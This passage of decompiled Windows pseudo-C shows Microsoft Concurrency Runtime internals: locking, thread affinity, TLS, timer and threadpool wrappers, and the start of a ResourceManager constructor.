    sub_46F32A(this);
  }
}

//----- (0046F17C) --------------------------------------------------------
#error "46F17C: call analysis failed (funcsize=8)"

//----- (0046F193) --------------------------------------------------------
void __thiscall sub_46F193(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0046F19B) --------------------------------------------------------
void __thiscall sub_46F19B(volatile signed __int32 *this)
{
  _InterlockedDecrement(this);
}

//----- (0046F19F) --------------------------------------------------------
void __thiscall sub_46F19F(volatile signed __int32 *this)
{
  *this = 0;
  _InterlockedDecrement(this + 1);
}

//----- (0046F1AA) --------------------------------------------------------
signed __int32 __thiscall sub_46F1AA(signed __int32 this, signed __int32 *a2)
{
  bool v3; // zf
  signed __int32 result; // eax

  *(_DWORD *)(this + 8) = a2[2];
  *(_DWORD *)(this + 4) = a2[1];
  v3 = *(_DWORD *)(this + 4) == 0;
  result = *a2;
  *(_DWORD *)this = *a2;
  if ( v3 )
  {
    result = _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), this, (signed __int32)a2);
    if ( (signed __int32 *)result != a2 )
    {
      sub_46F022(a2);
      *(_DWORD *)(this + 8) = a2[2];
      *(_DWORD *)(this + 4) = a2[1];
      result = *a2;
      *(_DWORD *)this = *a2;
    }
  }
  *(_DWORD *)(this + 24) = this;
  return result;
}

//----- (0046F1F9) --------------------------------------------------------
char __thiscall sub_46F1F9(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this, -1, 0) )
    return 0;
  _InterlockedIncrement(this + 1);
  return 1;
}

//----- (0046F210) --------------------------------------------------------
int sub_46F210()
{
  return dword_4E8190;
}
// 4E8190: using guessed type int dword_4E8190;

//----- (0046F216) --------------------------------------------------------
int __cdecl sub_46F216(_DWORD *a1, int a2, int a3)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int result; // eax

  v3 = 10;
LABEL_6:
  v5 = 0;
  while ( 1 )
  {
    result = a3 & *a1;
    if ( result == a2 )
      return result;
    v4 = v3;
    _mm_pause();
    if ( ++v5 >= (unsigned int)dword_4E8190 )
    {
      if ( v3 > 0 )
        --v3;
      sub_46F8D1(v4 <= 0);
      goto LABEL_6;
    }
  }
}
// 4E8190: using guessed type int dword_4E8190;

//----- (0046F253) --------------------------------------------------------
signed __int32 __thiscall sub_46F253(void *this)
{
  signed __int32 v3[6]; // [esp+4h] [ebp-18h] BYREF

  sub_46EC9C(-1);
  sub_46F0B3((int)this, v3, 0);
  return sub_46F1AA((signed __int32)this, v3);
}
// 46EC9C: using guessed type _DWORD __stdcall sub_46EC9C(_DWORD);
// 46F253: using guessed type signed __int32 var_18[6];

//----- (0046F281) --------------------------------------------------------
char __thiscall sub_46F281(signed __int32 this)
{
  HANDLE v3[2]; // [esp+8h] [ebp-18h] BYREF
  int v4; // [esp+10h] [ebp-10h]

  sub_46EC9C(v3, 0xFFFFFFFF);
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), (signed __int32)v3, 0) )
    return 0;
  *(_DWORD *)(this + 24) = v3;
  sub_46EFBA(v3, (_DWORD *)this);
  v4 &= ~1u;
  sub_46F1AA(this, (signed __int32 *)v3);
  return 1;
}
// 46F281: using guessed type HANDLE var_18[2];

//----- (0046F2CC) --------------------------------------------------------
char __thiscall sub_46F2CC(void *this, DWORD a2)
{
  HANDLE *v3; // eax
  char v4; // bl
  signed __int32 *v5; // esi

  v3 = (HANDLE *)operator new(0x18u);
  v4 = 0;
  if ( v3 )
    v5 = (signed __int32 *)sub_46EC9C(v3, a2);
  else
    v5 = 0;
  if ( sub_46F0B3((int)this, v5, 0) )
  {
    sub_46F1AA((signed __int32)this, v5);
    v4 = 1;
  }
  sub_46EEB0((int)v5);
  return v4;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0046F32A) --------------------------------------------------------
void __thiscall sub_46F32A(void *this)
{
  _DWORD *v2; // ecx
  int v3; // esi
  _DWORD *v4; // ebx

  v2 = (_DWORD *)*((_DWORD *)this + 6);
  *(_DWORD *)this = 0;
  v3 = v2[1];
  *((_DWORD *)this + 6) = v3;
  if ( v3
    || (_DWORD *)_InterlockedCompareExchange((volatile signed __int32 *)this + 7, 0, (signed __int32)v2) != v2
    && (v3 = sub_46F022(v2), (*((_DWORD *)this + 6) = v3) != 0) )
  {
    do
    {
      if ( sub_46EF88((volatile signed __int32 *)v3) )
        break;
      v4 = (_DWORD *)v3;
      v3 = *(_DWORD *)(v3 + 4);
      *((_DWORD *)this + 6) = v3;
      if ( !v3
        && (_DWORD *)_InterlockedCompareExchange((volatile signed __int32 *)this + 7, 0, (signed __int32)v4) != v4 )
      {
        v3 = sub_46F022(v4);
        *((_DWORD *)this + 6) = v3;
      }
      sub_46EEB0((int)v4);
    }
    while ( v3 );
  }
}

//----- (0046F3E4) --------------------------------------------------------
void __thiscall sub_46F3E4(char *this)
{
  int v2; // ecx

  v2 = *(_DWORD *)this;
  if ( v2 )
  {
    **(_DWORD **)(v2 + 256) = 0;
    sub_46F9A1(v2, 1);
  }
  sub_46EDCA((LPCRITICAL_SECTION)(this + 4));
}

//----- (0046F433) --------------------------------------------------------
int sub_46F433()
{
  HMODULE ModuleHandleW; // esi
  BOOL (__stdcall *SetThreadGroupAffinity)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY); // edi
  BOOL (__stdcall *GetThreadGroupAffinity)(HANDLE, PGROUP_AFFINITY); // eax
  BOOL (__stdcall *v3)(HANDLE, PGROUP_AFFINITY); // esi
  HMODULE v4; // eax
  void (__stdcall *GetCurrentProcessorNumberEx)(PPROCESSOR_NUMBER); // eax
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-10h] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  SetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY))GetProcAddress(
                                                                                                  ModuleHandleW,
                                                                                                  "SetThreadGroupAffinity");
  GetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, PGROUP_AFFINITY))GetProcAddress(
                                                                          ModuleHandleW,
                                                                          "GetThreadGroupAffinity");
  v3 = GetThreadGroupAffinity;
  if ( !SetThreadGroupAffinity || !GetThreadGroupAffinity )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_4F0BA8 = sub_46F9E3((int)SetThreadGroupAffinity);
  dword_4F0BAC = sub_46F9E3((int)v3);
  v4 = GetModuleHandleW(L"kernel32.dll");
  GetCurrentProcessorNumberEx = (void (__stdcall *)(PPROCESSOR_NUMBER))GetProcAddress(v4, "GetCurrentProcessorNumberEx");
  if ( !GetCurrentProcessorNumberEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  result = sub_46F9E3((int)GetCurrentProcessorNumberEx);
  dword_4F0BA4 = result;
  return result;
}
// 4F0BA4: using guessed type int dword_4F0BA4;
// 4F0BA8: using guessed type int dword_4F0BA8;
// 4F0BAC: using guessed type int dword_4F0BAC;
// 46F433: using guessed type _DWORD pExceptionObject[4];

//----- (0046F4E4) --------------------------------------------------------
BOOL __cdecl sub_46F4E4(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period)
{
  return ChangeTimerQueueTimer(TimerQueue, Timer, DueTime, Period);
}

//----- (0046F4FB) --------------------------------------------------------
BOOL __cdecl sub_46F4FB(HANDLE hObject)
{
  return CloseHandle(hObject);
}

//----- (0046F509) --------------------------------------------------------
int __cdecl sub_46F509(unsigned __int8 a1)
{
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = __crtCreateEventExW(0, 0, 2 * a1, 2031618);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 46B9F4: using guessed type _DWORD __cdecl __crtCreateEventExW(LPSECURITY_ATTRIBUTES lpEventAttributes, LPCWSTR lpName, _DWORD, _DWORD);
// 46F509: using guessed type _DWORD pExceptionObject[4];

//----- (0046F574) --------------------------------------------------------
BOOL __cdecl sub_46F574(
        PHANDLE phNewTimer,
        HANDLE TimerQueue,
        WAITORTIMERCALLBACK Callback,
        PVOID Parameter,
        DWORD DueTime,
        DWORD Period,
        ULONG Flags)
{
  return CreateTimerQueueTimer(phNewTimer, TimerQueue, Callback, Parameter, DueTime, Period, Flags);
}

//----- (0046F594) --------------------------------------------------------
DWORD __cdecl sub_46F594(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent)
{
  int i; // esi
  DWORD result; // eax

  for ( i = 16; i > 0; --i )
  {
    result = DeleteTimerQueueTimer(TimerQueue, Timer, CompletionEvent);
    if ( result )
      break;
    result = GetLastError();
    if ( result == 997 )
      break;
  }
  return result;
}

//----- (0046F5C3) --------------------------------------------------------
int __cdecl sub_46F5C3(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_46F9E3(dword_4F0BA4);
  return v1(v1, a1);
}
// 4F0BA4: using guessed type int dword_4F0BA4;

//----- (0046F5E5) --------------------------------------------------------
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_46F5E5(PDWORD ReturnedLength)
{
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v1; // eax
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v2; // edi
  int LastError; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  GetLogicalProcessorInformation(0, ReturnedLength);
  if ( GetLastError() != 122 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
    goto LABEL_9;
  }
  v1 = (struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *)malloc(*ReturnedLength);
  v2 = v1;
  if ( !v1 )
  {
    sub_45ABA0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !GetLogicalProcessorInformation(v1, ReturnedLength) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
LABEL_9:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_10:
    sub_4778B7(&v5, LastError);
    _CxxThrowException(&v5, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v2;
}

//----- (0046F66C) --------------------------------------------------------
void *__cdecl sub_46F66C(int a1, size_t *a2)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetLogicalProcessorInformationEx)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // eax
  BOOL (__stdcall *v4)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // esi
  int LastError; // eax
  void *v6; // eax
  void *v7; // edi
  int v9; // [esp+Ch] [ebp-10h] BYREF
  char pExceptionObject[12]; // [esp+10h] [ebp-Ch] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  GetLogicalProcessorInformationEx = (BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD))GetProcAddress(ModuleHandleW, "GetLogicalProcessorInformationEx");
  v4 = GetLogicalProcessorInformationEx;
  if ( !GetLogicalProcessorInformationEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
    goto LABEL_10;
  }
  ((void (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, _DWORD, size_t *))GetLogicalProcessorInformationEx)(
    GetLogicalProcessorInformationEx,
    a1,
    0,
    a2);
  if ( GetLastError() != 122 )
    goto LABEL_3;
  v6 = malloc(*a2);
  v7 = v6;
  if ( !v6 )
  {
    sub_45ABA0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !((int (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, void *, size_t *))v4)(
          v4,
          a1,
          v6,
          a2) )
  {
LABEL_3:
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
LABEL_10:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
    sub_4778B7(&v9, LastError);
    _CxxThrowException(&v9, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v7;
}

//----- (0046F720) --------------------------------------------------------
ULONG sub_46F720()
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  ULONG HighestNodeNumber; // [esp+10h] [ebp-4h] BYREF

  if ( !GetNumaHighestNodeNumber(&HighestNodeNumber) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return HighestNodeNumber;
}
// 46F720: using guessed type _DWORD pExceptionObject[4];

//----- (0046F763) --------------------------------------------------------
int __cdecl sub_46F763(int a1, int a2)
{
  void (__thiscall *v2)(_DWORD, int, int); // esi
  HANDLE CurrentProcess; // eax
  ULONG_PTR SystemAffinityMask; // [esp+0h] [ebp-8h] BYREF
  ULONG_PTR ProcessAffinityMask; // [esp+4h] [ebp-4h] BYREF

  if ( sub_471D09() < 4 )
  {
    CurrentProcess = GetCurrentProcess();
    GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask);
    *(_WORD *)(a2 + 4) = 0;
    *(_DWORD *)a2 = ProcessAffinityMask;
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, int, int))sub_46F9E3(dword_4F0BAC);
    v2(v2, a1, a2);
  }
  return 1;
}
// 471D09: using guessed type int sub_471D09(void);
// 4F0BAC: using guessed type int dword_4F0BAC;

//----- (0046F7BC) --------------------------------------------------------
int __cdecl sub_46F7BC(HANDLE hThread)
{
  return GetThreadPriority(hThread);
}

//----- (0046F7CF) --------------------------------------------------------
int __cdecl sub_46F7CF(struct _RTL_CRITICAL_SECTION *a1, DWORD a2)
{
  return __crtInitializeCriticalSectionEx(a1, a2, 0);
}
// 46BC46: using guessed type _DWORD __cdecl __crtInitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, _DWORD);

//----- (0046F7E4) --------------------------------------------------------
HANDLE __cdecl sub_46F7E4(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context)
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  HANDLE phNewWaitObject; // [esp+10h] [ebp-4h] BYREF

  if ( !RegisterWaitForSingleObject(&phNewWaitObject, hObject, Callback, Context, 0xFFFFFFFF, 0xCu) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return phNewWaitObject;
}
// 46F7E4: using guessed type _DWORD pExceptionObject[4];

//----- (0046F834) --------------------------------------------------------
int __cdecl sub_46F834(HANDLE hThread, DWORD_PTR *a2)
{
  void (__thiscall *v2)(_DWORD, HANDLE, DWORD_PTR *, _DWORD); // esi

  if ( sub_471D09() < 4 )
  {
    SetThreadAffinityMask(hThread, *a2);
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, HANDLE, DWORD_PTR *, _DWORD))sub_46F9E3(dword_4F0BA8);
    v2(v2, hThread, a2, 0);
  }
  return 1;
}
// 471D09: using guessed type int sub_471D09(void);
// 4F0BA8: using guessed type int dword_4F0BA8;

//----- (0046F878) --------------------------------------------------------
BOOL __cdecl sub_46F878(HANDLE hThread, int nPriority)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = SetThreadPriority(hThread, nPriority);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 46F878: using guessed type _DWORD pExceptionObject[4];

//----- (0046F8BA) --------------------------------------------------------
DWORD __cdecl sub_46F8BA(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable)
{
  return SignalObjectAndWait(hObjectToSignal, hObjectToWaitOn, dwMilliseconds, bAlertable);
}

//----- (0046F8D1) --------------------------------------------------------
void __cdecl sub_46F8D1(DWORD dwMilliseconds)
{
  Sleep(dwMilliseconds);
}

//----- (0046F8E5) --------------------------------------------------------
DWORD sub_46F8E5()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 46F8E5: using guessed type _DWORD pExceptionObject[4];

//----- (0046F922) --------------------------------------------------------
BOOL __cdecl sub_46F922(DWORD dwTlsIndex)
{
  return TlsFree(dwTlsIndex);
}

//----- (0046F930) --------------------------------------------------------
LPVOID __cdecl sub_46F930(DWORD dwTlsIndex)
{
  return TlsGetValue(dwTlsIndex);
}

//----- (0046F93E) --------------------------------------------------------
BOOL __cdecl sub_46F93E(DWORD dwTlsIndex, LPVOID lpTlsValue)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsSetValue(dwTlsIndex, lpTlsValue);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 46F93E: using guessed type _DWORD pExceptionObject[4];

//----- (0046F980) --------------------------------------------------------
BOOL __cdecl sub_46F980(HANDLE WaitHandle)
{
  return UnregisterWait(WaitHandle);
}

//----- (0046F98E) --------------------------------------------------------
DWORD __cdecl sub_46F98E(HANDLE hHandle, DWORD dwMilliseconds)
{
  return WaitForSingleObjectEx(hHandle, dwMilliseconds, 0);
}

//----- (0046F9A1) --------------------------------------------------------
int __thiscall sub_46F9A1(int this, char a2)
{
  int result; // eax

  if ( a2 )
    result = _InterlockedIncrement((volatile signed __int32 *)(this + 1288));
  else
    result = *(_DWORD *)(this + 1280) - *(_DWORD *)(this + 1284);
  if ( result == 1 )
    return SetEvent(*(HANDLE *)this);
  return result;
}

//----- (0046F9D5) --------------------------------------------------------
int *sub_46F9D5()
{
  int *result; // eax

  if ( hLibModule )
    return sub_474B8A();
  return result;
}

//----- (0046F9E3) --------------------------------------------------------
int __cdecl sub_46F9E3(int a1)
{
  return a1 ^ dword_4F0C20;
}
// 4F0C20: using guessed type int dword_4F0C20;

//----- (0046F9F0) --------------------------------------------------------
HMODULE __cdecl sub_46F9F0(int a1)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a1, 0, 0, 0);
  unknown_libname_24(a1, 1);
  unknown_libname_14(a1);
  sub_474B8A();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)FreeLibrary(hLibModule);
  return result;
}
// 46B9B0: using guessed type _DWORD __cdecl unknown_libname_14(_DWORD);
// 46BCBF: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 46BD81: using guessed type _DWORD __cdecl unknown_libname_24(_DWORD, _DWORD);

//----- (0046FA2C) --------------------------------------------------------
HMODULE __cdecl sub_46FA2C(DWORD dwExitCode)
{
  HMODULE result; // eax

  result = (HMODULE)_InterlockedExchangeAdd(&dword_4F0BB8, 0xFFFFFFFF);
  if ( !result )
  {
    sub_474B8A();
    result = hLibModule;
    if ( hLibModule )
      FreeLibraryAndExitThread(hLibModule, dwExitCode);
  }
  return result;
}
// 4F0BB8: using guessed type int dword_4F0BB8;

//----- (0046FA56) --------------------------------------------------------
uintptr_t sub_46FA56()
{
  uintptr_t v0; // esi
  HANDLE CurrentThread; // eax
  struct _FILETIME CreationTime; // [esp+4h] [ebp-10h] BYREF
  struct _FILETIME ExitTime; // [esp+Ch] [ebp-8h] BYREF

  dword_4F0C18 = 1;
  v0 = __security_cookie ^ (unsigned int)EncodePointer(&dword_4F0C20);
  CurrentThread = GetCurrentThread();
  if ( GetThreadTimes(CurrentThread, &CreationTime, &ExitTime, &ExitTime, &ExitTime) )
    v0 ^= CreationTime.dwLowDateTime ^ CreationTime.dwHighDateTime;
  return v0;
}
// 4F0C18: using guessed type int dword_4F0C18;
// 4F0C20: using guessed type int dword_4F0C20;

//----- (0046FAA2) --------------------------------------------------------
int __cdecl sub_46FAA2(
        struct _SECURITY_ATTRIBUTES *a1,
        SIZE_T a2,
        DWORD (__stdcall *a3)(LPVOID lpThreadParameter),
        void *a4,
        DWORD a5,
        DWORD *a6)
{
  int Semaphore; // esi

  Semaphore = __crtCreateSemaphoreExW_0(a1, a2, a3, a4, a5, a6);
  if ( Semaphore && _InterlockedIncrement(&dword_4F0BB8) == 1 )
  {
    sub_46FAE8();
    _InterlockedIncrement(&dword_4E81A4);
  }
  return Semaphore;
}
// 46F557: using guessed type _DWORD __cdecl __crtCreateSemaphoreExW_0(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// 4E81A4: using guessed type int dword_4E81A4;
// 4F0BB8: using guessed type int dword_4F0BB8;

//----- (0046FAE8) --------------------------------------------------------
HMODULE sub_46FAE8()
{
  HMODULE result; // eax
  DWORD ModuleFileNameW; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-21Ch] BYREF
  WCHAR Filename[260]; // [esp+14h] [ebp-20Ch] BYREF

  result = GetModuleHandleA(0);
  if ( result != (HMODULE)0x400000 )
  {
    ModuleFileNameW = GetModuleFileNameW((HMODULE)0x400000, Filename, 0x104u);
    if ( !ModuleFileNameW || ModuleFileNameW == 260 )
    {
      LastError = GetLastError();
      if ( LastError > 0 )
        LastError = (unsigned __int16)LastError | 0x80070000;
      sub_4778B7(pExceptionObject, LastError);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
    result = LoadLibraryExW(Filename, 0, 0);
    hLibModule = result;
  }
  return result;
}
// 46FAE8: using guessed type _DWORD pExceptionObject[4];

//----- (0046FB7C) --------------------------------------------------------
int __cdecl sub_46FB7C(unsigned int a1, int a2, int a3, char a4)
{
  int result; // eax
  int v5; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  result = unknown_libname_16(a2, a3, 0);
  v5 = result;
  if ( result )
  {
    sub_46FAE8();
    _InterlockedIncrement(&dword_4E81A4);
    v6 = -10000i64 * a1;
    __crtSetThreadpoolTimer(v5, &v6, a4 != 0 ? a1 : 0, 0);
    return v5;
  }
  return result;
}
// 46BA92: using guessed type _DWORD __cdecl unknown_libname_16(_DWORD, _DWORD, _DWORD);
// 46BCBF: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 4E81A4: using guessed type int dword_4E81A4;

//----- (0046FBDB) --------------------------------------------------------
int __cdecl sub_46FBDB(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // esi

  result = unknown_libname_17(a2, a3, 0);
  v4 = result;
  if ( result )
  {
    sub_46FAE8();
    _InterlockedIncrement(&dword_4E81A4);
    __crtSetThreadpoolWait(v4, a1, 0);
    return v4;
  }
  return result;
}
// 46BABE: using guessed type _DWORD __cdecl unknown_libname_17(_DWORD, _DWORD, _DWORD);
// 46BCEA: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);
// 4E81A4: using guessed type int dword_4E81A4;

//----- (0046FC14) --------------------------------------------------------
HMODULE __cdecl sub_46FC14(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a2, 0, 0, 0);
  unknown_libname_14(a2);
  sub_474B8A();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_18(a1, hLibModule);
  return result;
}
// 46B9B0: using guessed type _DWORD __cdecl unknown_libname_14(_DWORD);
// 46BB05: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD);
// 46BCBF: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0046FC4A) --------------------------------------------------------
HMODULE __cdecl sub_46FC4A(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolWait(a2, 0, 0);
  unknown_libname_15(a2);
  sub_474B8A();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_18(a1, hLibModule);
  return result;
}
// 46B9D2: using guessed type _DWORD __cdecl unknown_libname_15(_DWORD);
// 46BB05: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD);
// 46BCEA: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);

//----- (0046FC7F) --------------------------------------------------------
__int32 __thiscall sub_46FC7F(volatile __int32 *this)
{
  sub_478772();
  return sub_46FC8F(this);
}
// 478772: using guessed type int sub_478772(void);

//----- (0046FC8F) --------------------------------------------------------
__int32 __thiscall sub_46FC8F(volatile __int32 *this)
{
  __int32 result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  result = _InterlockedExchange(this, 1);
  if ( result )
  {
    v4 = 0;
    v5 = sub_46FCCB;
    do
    {
      sub_46E3D5((int)v3);
      result = _InterlockedExchange(this, 1);
    }
    while ( result );
  }
  return result;
}
// 46FC8F: using guessed type char var_10[8];

//----- (0046FCC0) --------------------------------------------------------
int __thiscall sub_46FCC0(_DWORD *this)
{
  *this = 0;
  return sub_478772();
}
// 478772: using guessed type int sub_478772(void);

//----- (0046FCCB) --------------------------------------------------------
void sub_46FCCB()
{
  sub_46F8D1(0);
}

//----- (0046FCD4) --------------------------------------------------------
char __thiscall sub_46FCD4(volatile __int32 *this)
{
  char v2; // bl

  sub_478772();
  v2 = sub_46FCF4(this);
  if ( !v2 )
    sub_478772();
  return v2;
}
// 478772: using guessed type int sub_478772(void);

//----- (0046FCF4) --------------------------------------------------------
char __thiscall sub_46FCF4(volatile __int32 *this)
{
  char v1; // dl

  if ( *this )
    return 0;
  v1 = 1;
  if ( _InterlockedExchange(this, 1) )
    return 0;
  return v1;
}

//----- (0046FD09) --------------------------------------------------------
int sub_46FD09()
{
  LPVOID v0; // eax

  v0 = sub_476ED0();
  if ( v0 )
    return (*(int (__thiscall **)(LPVOID))(*(_DWORD *)v0 + 32))(v0);
  else
    return SwitchToThread();
}

//----- (0046FD30) --------------------------------------------------------
int sub_46FD30()
{
  int v0; // edi

  v0 = sub_46EE8E();
  return (*(int (__thiscall **)(int))(*(_DWORD *)v0 + 24))(v0);
}
// 46EE8E: using guessed type int sub_46EE8E(void);

//----- (0046FD52) --------------------------------------------------------
_DWORD *__thiscall sub_46FD52(_DWORD *this, int a2)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  sub_46F763(a2, (int)this);
  return this;
}

//----- (0046FD73) --------------------------------------------------------
char *__thiscall sub_46FD73(char *this)
{
  _BYTE *v2; // eax
  char pExceptionObject[12]; // [esp+10h] [ebp-1Ch] BYREF
  char *v5; // [esp+1Ch] [ebp-10h]
  int v6; // [esp+28h] [ebp-4h]

  v5 = this;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  *((_DWORD *)this + 1) = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 3) = 16;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  sub_46ED40((struct _RTL_CRITICAL_SECTION *)(this + 44));
  *((_DWORD *)this + 17) = 0;
  *((_DWORD *)this + 18) = 0;
  *((_DWORD *)this + 19) = 0;
  *((_DWORD *)this + 20) = 0;
  *((_DWORD *)this + 21) = 0;
  *((_DWORD *)this + 22) = 0;
